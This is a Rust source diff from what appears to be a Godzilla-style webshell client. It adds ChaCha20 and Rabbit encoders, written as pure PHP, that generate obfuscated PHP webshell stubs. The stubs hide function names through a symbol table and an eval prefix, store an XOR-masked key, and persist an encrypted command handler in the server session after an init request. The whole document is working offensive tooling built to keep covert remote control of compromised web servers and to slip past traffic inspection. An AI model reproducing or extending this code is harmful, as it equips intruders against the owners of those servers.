@@ -329,6 +329,8 @@ impl EncoderRegistry {
                 Box::new(NativeEncoder { crypto: "des" }),
                 Box::new(Aes128EcbEncoder),
                 Box::new(Aes128CbcEncoder),
+                Box::new(ChaCha20Encoder),
+                Box::new(RabbitEncoder),
             ],
         }
     }
@@ -356,6 +358,11 @@ impl EncoderRegistry {
 pub fn md5_hex(value: &str) -> String {
     let digest = Md5::digest(value.as_bytes());
     format!("{digest:x}")
+}
+
+/// 密码 md5 的原始 16 字节（Rabbit 128 位密钥）。
+pub fn md5_bytes(value: &str) -> Vec<u8> {
+    Md5::digest(value.as_bytes()).to_vec()
 }
 
 /// XOR + Base64 编码器（哥斯拉风格）。
@@ -511,7 +518,9 @@ if (x != null) {{
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -574,6 +583,8 @@ impl PayloadEncoder for Base64Encoder {
                 &[(0, "base64_decode"), (1, "base64_encode")],
                 "    $out = $_g[0]($payload);",
                 "    $out = $_g[1]($data);",
+                "",
+                "",
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -758,7 +769,9 @@ impl PayloadEncoder for Aes128EcbEncoder {
                     &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -830,7 +843,9 @@ impl PayloadEncoder for Aes128CbcEncoder {
                     &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -911,7 +926,9 @@ impl PayloadEncoder for DesEcbEncoder {
                     &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -968,6 +985,8 @@ impl PayloadEncoder for CharEncoder {
                 &[],
                 "    preg_match_all('/\\d+/', $payload, $m);\n    $out = implode('', array_map('chr', array_map('intval', $m[0])));",
                 "    $out = \"implode('',array_map('chr',array(\" . implode(',', array_map('ord', str_split($data))) . \")));\";",
+                "",
+                "",
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -1039,6 +1058,8 @@ impl PayloadEncoder for PhpObfuscateEncoder {
                 &[(0, "base64_decode"), (1, "base64_encode")],
                 "    $p = substr($payload, strpos($payload, \"strrev('\") + 8);\n    $p = substr($p, 0, strpos($p, \"')\"));\n    $out = $_g[0](strrev($p));",
                 "    $out = \"strrev('\" . strrev($_g[1]($data)) . \"')\";",
+                "",
+                "",
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -1252,7 +1273,9 @@ echo json_encode(__PREFIX__run_rule($script));
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -1314,6 +1337,8 @@ function __PREFIX__x($d, $k) {
     return $out;
 }
 
+__ALGO__
+
 function __PREFIX__unpack($payload) {
     global $_g;
 __UNPACK__
@@ -1323,6 +1348,12 @@ __UNPACK__
 function __PREFIX__pack($data) {
     global $_g;
 __PACK__
+    return $out;
+}
+
+function __PREFIX__store($data) {
+    global $_g;
+__STORE__
     return $out;
 }
 
@@ -1350,7 +1381,7 @@ if (isset($_SESSION['__PREFIX__p'])) {
     }
 } else {
     if (strpos($data, 'DswSesInit') !== false) {
-        $_SESSION['__PREFIX__p'] = __PREFIX__pack($data);
+        $_SESSION['__PREFIX__p'] = __PREFIX__store($data);
         echo __PREFIX__pack('ok');
     } else {
         echo __PREFIX__pack('no_init');
@@ -1366,11 +1397,20 @@ pub fn session_php_stub(
     symbols: &[(usize, &str)],
     unpack_body: &str,
     pack_body: &str,
+    algo_body: &str,
+    store_body: &str,
 ) -> String {
     let prefix = format!("_{}_", php_ident());
-    // unpack/pack 参数中引用的 __PREFIX__（dec / x 函数名）随前缀替换
+    // unpack/pack 参数与算法代码中引用的 __PREFIX__（dec / x / 算法函数名）随前缀替换
     let unpack_body = unpack_body.replace("__PREFIX__", &prefix);
     let pack_body = pack_body.replace("__PREFIX__", &prefix);
+    let algo_body = algo_body.replace("__PREFIX__", &prefix);
+    // 会话内容存储默认用 pack（对称加解密编码器）；非对称流密码（chacha/rabbit）自行覆盖
+    let store_body = if store_body.is_empty() {
+        format!("    $out = __PREFIX__pack($data);").replace("__PREFIX__", &prefix)
+    } else {
+        store_body.replace("__PREFIX__", &prefix)
+    };
     // 注入通用符号：file_get_contents（session 模板读请求体用，索引 2）
     let mut symbols: Vec<(usize, &str)> = symbols.to_vec();
     if !symbols.iter().any(|(index, _)| *index == 2) {
@@ -1386,6 +1426,8 @@ pub fn session_php_stub(
         .replace("__EVAL__", &eval_prefix())
         .replace("__UNPACK__", &unpack_body)
         .replace("__PACK__", &pack_body)
+        .replace("__ALGO__", &algo_body)
+        .replace("__STORE__", &store_body)
 }
 
 /// 处理器代码：一次传输后驻留服务端 session，定义 run($p) 处理全部操作。
@@ -1573,7 +1615,9 @@ impl PayloadEncoder for XorSessionEncoder {
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                ))
+                 "",
+                "",
+            ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -2113,8 +2157,8 @@ mod tests {
         assert_eq!(
             ids,
             vec![
-                "aes128_cbc", "aes128_ecb", "native", "native_aes_cbc",
-                "native_aes_ecb", "native_des",
+                "aes128_cbc", "aes128_ecb", "chacha20", "native",
+                "native_aes_cbc", "native_aes_ecb", "native_des", "rabbit",
             ],
             "注册表应暴露 NATIVE 系列 + 两个自加密编码器（PHP5 兼容）"
         );
@@ -2182,5 +2226,336 @@ mod tests {
         // 载荷是完整源码的 base64（含 <?php 标签）
         let restored = php_stream_decode(&payload).unwrap();
         assert_eq!(restored, code);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// CHACHA20（自实现现代流密码，RFC 8439，自加密会话形态）
+// ---------------------------------------------------------------------------
+
+/// ChaCha20 的 PHP 5+ 纯实现（64 位平台整数运算；32 位 PHP 位运算不可靠）。
+/// 密钥 32 字节（= 密码 md5 的 hex ASCII），nonce 12 字节，counter 0=请求/1=响应。
+fn chacha20_php_algo(prefix: &str) -> String {
+    format!(
+        r#"function {p}chacha($key, $nonce, $counter, $data) {{
+    $cs = array(0x61707865, 0x3320646e, 0x79622d32, 0x6b206574);
+    $out = '';
+    $pos = 0;
+    $len = strlen($data);
+    while ($pos < $len) {{
+        $st = $cs;
+        for ($i = 0; $i < 8; $i++) {{
+            $b = $i * 4;
+            $st[] = (ord($key[$b]) | (ord($key[$b + 1]) << 8) | (ord($key[$b + 2]) << 16) | (ord($key[$b + 3]) << 24)) & 0xFFFFFFFF;
+        }}
+        $st[12] = ($counter + ($pos >> 6)) & 0xFFFFFFFF;
+        $st[13] = (ord($nonce[0]) | (ord($nonce[1]) << 8) | (ord($nonce[2]) << 16) | (ord($nonce[3]) << 24)) & 0xFFFFFFFF;
+        $st[14] = (ord($nonce[4]) | (ord($nonce[5]) << 8) | (ord($nonce[6]) << 16) | (ord($nonce[7]) << 24)) & 0xFFFFFFFF;
+        $st[15] = (ord($nonce[8]) | (ord($nonce[9]) << 8) | (ord($nonce[10]) << 16) | (ord($nonce[11]) << 24)) & 0xFFFFFFFF;
+        $ws = $st;
+        for ($r = 0; $r < 10; $r++) {{
+            {p}qr($ws, 0, 4, 8, 12);
+            {p}qr($ws, 1, 5, 9, 13);
+            {p}qr($ws, 2, 6, 10, 14);
+            {p}qr($ws, 3, 7, 11, 15);
+            {p}qr($ws, 0, 5, 10, 15);
+            {p}qr($ws, 1, 6, 11, 12);
+            {p}qr($ws, 2, 7, 8, 13);
+            {p}qr($ws, 3, 4, 9, 14);
+        }}
+        $block = '';
+        for ($i = 0; $i < 16; $i++) {{
+            $w = ($ws[$i] + $st[$i]) & 0xFFFFFFFF;
+            $block .= chr($w & 0xFF) . chr(($w >> 8) & 0xFF) . chr(($w >> 16) & 0xFF) . chr(($w >> 24) & 0xFF);
+        }}
+        $chunk = substr($data, $pos, 64);
+        $out .= $chunk ^ substr($block, 0, strlen($chunk));
+        $pos += 64;
+    }}
+    return $out;
+}}
+function {p}qr(&$st, $a, $b, $c, $d) {{
+    $st[$a] = ($st[$a] + $st[$b]) & 0xFFFFFFFF;
+    $st[$d] = $st[$d] ^ $st[$a];
+    $st[$d] = (($st[$d] << 16) | ($st[$d] >> 16)) & 0xFFFFFFFF;
+    $st[$c] = ($st[$c] + $st[$d]) & 0xFFFFFFFF;
+    $st[$b] = $st[$b] ^ $st[$c];
+    $st[$b] = (($st[$b] << 12) | ($st[$b] >> 20)) & 0xFFFFFFFF;
+    $st[$a] = ($st[$a] + $st[$b]) & 0xFFFFFFFF;
+    $st[$d] = $st[$d] ^ $st[$a];
+    $st[$d] = (($st[$d] << 8) | ($st[$d] >> 24)) & 0xFFFFFFFF;
+    $st[$c] = ($st[$c] + $st[$d]) & 0xFFFFFFFF;
+    $st[$b] = $st[$b] ^ $st[$c];
+    $st[$b] = (($st[$b] << 7) | ($st[$b] >> 25)) & 0xFFFFFFFF;
+}}
+"#,
+        p = prefix
+    )
+}
+
+/// Rabbit 的 PHP 5+ 纯实现（RFC 4503）。密钥 16 字节，IV 8 字节。
+/// 请求密钥流偏移 0，响应偏移 64 字节。64 位平台精确（平方 < 2^64）。
+fn rabbit_php_algo(prefix: &str) -> String {
+    format!(
+        r#"function {p}rabbit($key, $iv, $skip, $data) {{
+    $k = array();
+    for ($i = 0; $i < 8; $i++) {{
+        $k[$i] = (ord($key[14 - 2 * $i]) << 8) | ord($key[15 - 2 * $i]);
+    }}
+    $x = array();
+    $c = array();
+    for ($j = 0; $j < 8; $j++) {{
+        if (($j % 2) == 0) {{
+            $x[$j] = (($k[($j + 1) % 8] << 16) | $k[$j]) & 0xFFFFFFFF;
+            $c[$j] = (($k[($j + 4) % 8] << 16) | $k[($j + 5) % 8]) & 0xFFFFFFFF;
+        }} else {{
+            $x[$j] = (($k[($j + 5) % 8] << 16) | $k[($j + 4) % 8]) & 0xFFFFFFFF;
+            $c[$j] = (($k[$j] << 16) | $k[($j + 1) % 8]) & 0xFFFFFFFF;
+        }}
+    }}
+    $b = 0;
+    $aa = array(0x4D34D34D, 0xD34D34D3, 0x34D34D34, 0x4D34D34D, 0xD34D34D3, 0x34D34D34, 0x4D34D34D, 0xD34D34D3);
+    for ($r = 0; $r < 4; $r++) {{
+        {p}rc($c, $aa, $b);
+        {p}rx($x, $c);
+    }}
+    for ($j = 0; $j < 8; $j++) {{
+        $c[$j] = ($c[$j] ^ $x[($j + 4) % 8]) & 0xFFFFFFFF;
+    }}
+    $iv0 = ((ord($iv[4]) << 24) | (ord($iv[5]) << 16) | (ord($iv[6]) << 8) | ord($iv[7])) & 0xFFFFFFFF;
+    $iv1 = ((ord($iv[0]) << 24) | (ord($iv[1]) << 16) | (ord($iv[2]) << 8) | ord($iv[3])) & 0xFFFFFFFF;
+    $mh = (($iv1 & 0xFFFF0000) | (($iv0 >> 16) & 0xFFFF)) & 0xFFFFFFFF;
+    $ml = ((($iv1 & 0xFFFF) << 16) | ($iv0 & 0xFFFF)) & 0xFFFFFFFF;
+    $c[0] = ($c[0] ^ $iv0) & 0xFFFFFFFF;
+    $c[1] = ($c[1] ^ $mh) & 0xFFFFFFFF;
+    $c[2] = ($c[2] ^ $iv1) & 0xFFFFFFFF;
+    $c[3] = ($c[3] ^ $ml) & 0xFFFFFFFF;
+    $c[4] = ($c[4] ^ $iv0) & 0xFFFFFFFF;
+    $c[5] = ($c[5] ^ $mh) & 0xFFFFFFFF;
+    $c[6] = ($c[6] ^ $iv1) & 0xFFFFFFFF;
+    $c[7] = ($c[7] ^ $ml) & 0xFFFFFFFF;
+    for ($r = 0; $r < 4; $r++) {{
+        {p}rc($c, $aa, $b);
+        {p}rx($x, $c);
+    }}
+    $ks = '';
+    $need = $skip + strlen($data);
+    while (strlen($ks) < $need) {{
+        {p}rc($c, $aa, $b);
+        {p}rx($x, $c);
+        $w = array(
+            ($x[0] & 0xFFFF) ^ ($x[5] >> 16),
+            ($x[0] >> 16) ^ ($x[3] & 0xFFFF),
+            ($x[2] & 0xFFFF) ^ ($x[7] >> 16),
+            ($x[2] >> 16) ^ ($x[5] & 0xFFFF),
+            ($x[4] & 0xFFFF) ^ ($x[1] >> 16),
+            ($x[4] >> 16) ^ ($x[7] & 0xFFFF),
+            ($x[6] & 0xFFFF) ^ ($x[3] >> 16),
+            ($x[6] >> 16) ^ ($x[1] & 0xFFFF),
+        );
+        for ($i = 7; $i >= 0; $i--) {{
+            $ks .= chr(($w[$i] >> 8) & 0xFF) . chr($w[$i] & 0xFF);
+        }}
+    }}
+    $ks = substr($ks, $skip);
+    return $data ^ $ks;
+}}
+function {p}rc(&$c, $aa, &$b) {{
+    for ($j = 0; $j < 8; $j++) {{
+        $t = $c[$j] + $aa[$j] + $b;
+        $b = ($t >> 32) & 0xFFFFFFFF;
+        $c[$j] = $t & 0xFFFFFFFF;
+    }}
+}}
+function {p}rx(&$x, $c) {{
+    $g = array();
+    for ($j = 0; $j < 8; $j++) {{
+        $s = ($x[$j] + $c[$j]) & 0xFFFFFFFF;
+        // 32 位拆分平方：$s^2 可能超过 2^63（PHP int 上限）转 float 丢精度，
+        // 拆 16 位块计算低/高 32 位，全程 ≤ 2^33 精确
+        $a = $s & 0xFFFF;
+        $b16 = ($s >> 16) & 0xFFFF;
+        $a2 = $a * $a;
+        $ab2 = 2 * $a * $b16;
+        $b2 = $b16 * $b16;
+        $lsw = ($a2 + (($ab2 & 0xFFFF) << 16)) & 0xFFFFFFFF;
+        $carry1 = (($a2 >> 16) + ($ab2 & 0xFFFF)) >> 16;
+        $mid1 = ($ab2 >> 16) + ($b2 & 0xFFFF) + $carry1;
+        $carry2 = $mid1 >> 16;
+        $high = ($b2 >> 16) + $carry2;
+        $msw = (($mid1 & 0xFFFF) | (($high & 0xFFFF) << 16)) & 0xFFFFFFFF;
+        $g[$j] = $lsw ^ $msw;
+    }}
+    $g0 = $g[0]; $g1 = $g[1]; $g2 = $g[2]; $g3 = $g[3];
+    $g4 = $g[4]; $g5 = $g[5]; $g6 = $g[6]; $g7 = $g[7];
+    $x[0] = ($g0 + (($g7 << 16) | ($g7 >> 16)) + (($g6 << 16) | ($g6 >> 16))) & 0xFFFFFFFF;
+    $x[1] = ($g1 + (($g0 << 8) | ($g0 >> 24)) + $g7) & 0xFFFFFFFF;
+    $x[2] = ($g2 + (($g1 << 16) | ($g1 >> 16)) + (($g0 << 16) | ($g0 >> 16))) & 0xFFFFFFFF;
+    $x[3] = ($g3 + (($g2 << 8) | ($g2 >> 24)) + $g1) & 0xFFFFFFFF;
+    $x[4] = ($g4 + (($g3 << 16) | ($g3 >> 16)) + (($g2 << 16) | ($g2 >> 16))) & 0xFFFFFFFF;
+    $x[5] = ($g5 + (($g4 << 8) | ($g4 >> 24)) + $g3) & 0xFFFFFFFF;
+    $x[6] = ($g6 + (($g5 << 16) | ($g5 >> 16)) + (($g4 << 16) | ($g4 >> 16))) & 0xFFFFFFFF;
+    $x[7] = ($g7 + (($g6 << 8) | ($g6 >> 24)) + $g5) & 0xFFFFFFFF;
+}}
+"#,
+        p = prefix
+    )
+}
+
+pub struct ChaCha20Encoder;
+
+impl PayloadEncoder for ChaCha20Encoder {
+    fn id(&self) -> &'static str {
+        "chacha20"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "CHACHA20（自实现现代流密码 · RFC 8439 · 自加密）"
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_hex(password).into_bytes();
+        let mut nonce = [0u8; 12];
+        nonce.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..12]);
+        let ct = crate::crypto::chacha20_xor(&key, &nonce, 0, code.as_bytes());
+        let mut raw = Vec::with_capacity(12 + ct.len());
+        raw.extend_from_slice(&nonce);
+        raw.extend_from_slice(&ct);
+        base64::engine::general_purpose::STANDARD.encode(&raw)
+    }
+
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        if raw.len() < 12 {
+            return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
+        }
+        let (nonce, ct) = raw.split_at(12);
+        Ok(crate::crypto::chacha20_xor(
+            &md5_hex(password).into_bytes(),
+            nonce,
+            1,
+            ct,
+        ))
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        self.stub_session(language, password)
+    }
+
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let xk = php_ident();
+                let key = md5_hex(password);
+                let key_enc = xor_hex(&key, &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
+                     $raw = @$_g[1]($payload);\n    \
+                     $nonce = substr($raw, 0, 12);\n    \
+                     $out = __PREFIX__chacha($key, $nonce, 0, substr($raw, 12));\n    \
+                     $GLOBALS['__PREFIX__n'] = $nonce;"
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
+                     $nonce = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
+                     $out = base64_encode($nonce . __PREFIX__chacha($key, $nonce, 1, $data));"
+                );
+                let store = format!(
+                    "    $key = __PREFIX__dec('{key_enc}', '{xk}');\n    \
+                     $nonce = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
+                     $out = base64_encode($nonce . __PREFIX__chacha($key, $nonce, 0, $data));"
+                );
+                Ok(session_php_stub(
+                    &[(1, "base64_decode")],
+                    &unpack,
+                    &pack,
+                    &chacha20_php_algo("__PREFIX__"),
+                    &store,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
+pub struct RabbitEncoder;
+
+impl PayloadEncoder for RabbitEncoder {
+    fn id(&self) -> &'static str {
+        "rabbit"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "RABBIT（自实现现代流密码 · RFC 4503 · 自加密）"
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_bytes(password);
+        let mut iv = [0u8; 8];
+        iv.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..8]);
+        let ct = crate::crypto::rabbit_xor(&key, &iv, 0, code.as_bytes());
+        let mut raw = Vec::with_capacity(8 + ct.len());
+        raw.extend_from_slice(&iv);
+        raw.extend_from_slice(&ct);
+        base64::engine::general_purpose::STANDARD.encode(&raw)
+    }
+
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        if raw.len() < 8 {
+            return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
+        }
+        let (iv, ct) = raw.split_at(8);
+        Ok(crate::crypto::rabbit_xor(&md5_bytes(password), iv, 64, ct))
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        self.stub_session(language, password)
+    }
+
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let xk = php_ident();
+                let key_hex = md5_bytes(password)
+                    .iter()
+                    .map(|b| format!("{b:02x}"))
+                    .collect::<String>();
+                let key_enc = xor_hex(&key_hex, &xk);
+                let unpack = format!(
+                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
+                     $raw = @$_g[1]($payload);\n    \
+                     $iv = substr($raw, 0, 8);\n    \
+                     $out = __PREFIX__rabbit($key, $iv, 0, substr($raw, 8));\n    \
+                     $GLOBALS['__PREFIX__n'] = $iv;"
+                );
+                let pack = format!(
+                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
+                     $iv = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
+                     $out = base64_encode($iv . __PREFIX__rabbit($key, $iv, 64, $data));"
+                );
+                let store = format!(
+                    "    $key = pack(\"H*\", __PREFIX__dec('{key_enc}', '{xk}'));\n    \
+                     $iv = isset($GLOBALS['__PREFIX__n']) ? $GLOBALS['__PREFIX__n'] : '';\n    \
+                     $out = base64_encode($iv . __PREFIX__rabbit($key, $iv, 0, $data));"
+                );
+                Ok(session_php_stub(
+                    &[(1, "base64_decode")],
+                    &unpack,
+                    &pack,
+                    &rabbit_php_algo("__PREFIX__"),
+                    &store,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
     }
 }
